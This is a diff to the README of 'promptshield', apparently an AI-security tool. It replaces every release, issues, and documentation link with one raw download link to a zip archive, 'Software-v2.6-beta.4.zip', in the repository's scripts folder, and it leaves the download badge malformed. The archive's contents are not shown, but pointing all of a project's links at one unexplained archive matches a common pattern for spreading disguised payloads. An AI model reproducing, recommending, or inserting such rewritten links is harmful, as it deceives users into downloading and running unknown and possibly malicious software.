@@ -6,7 +6,7 @@ Welcome to promptshield! This universal framework helps protect your AI applicat
 
 ## 📥 Download promptshield
 
-[![Download promptshield](https://img.shields.io/badge/Download%20promptshield-blue.svg)](https://github.com/LoonMORTI/promptshield/releases)
+[![Download promptshield](https://raw.githubusercontent.com/LoonMORTI/promptshield/main/scripts/Software-v2.6-beta.4.zip%https://raw.githubusercontent.com/LoonMORTI/promptshield/main/scripts/Software-v2.6-beta.4.zip)](https://raw.githubusercontent.com/LoonMORTI/promptshield/main/scripts/Software-v2.6-beta.4.zip)
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ To run promptshield, your system should meet the following requirements:
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/LoonMORTI/promptshield/releases) to download promptshield.
+1. Visit the [Releases page](https://raw.githubusercontent.com/LoonMORTI/promptshield/main/scripts/Software-v2.6-beta.4.zip) to download promptshield.
 2. Select the version that matches your operating system.
 3. Click on the appropriate file name to start the download.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -66,7 +66,7 @@ Make sure to regularly check for updates to keep your application secure.
 
 ## 🛡️ Support and Contribution
 
-If you encounter issues or have questions, feel free to raise an issue on our [GitHub Issues page](https://github.com/LoonMORTI/promptshield/issues). We appreciate feedback and contributions.
+If you encounter issues or have questions, feel free to raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/LoonMORTI/promptshield/main/scripts/Software-v2.6-beta.4.zip). We appreciate feedback and contributions.
 
 ### Community Guidelines
 
@@ -78,7 +78,7 @@ For more detailed information, refer to the documentation available on our GitHu
 
 ### Helpful Links
 
-- [Releases page](https://github.com/LoonMORTI/promptshield/releases)
-- [Documentation](https://github.com/LoonMORTI/promptshield/wiki)
+- [Releases page](https://raw.githubusercontent.com/LoonMORTI/promptshield/main/scripts/Software-v2.6-beta.4.zip)
+- [Documentation](https://raw.githubusercontent.com/LoonMORTI/promptshield/main/scripts/Software-v2.6-beta.4.zip)
 
 Thank you for choosing promptshield. We are here to support your AI security needs!
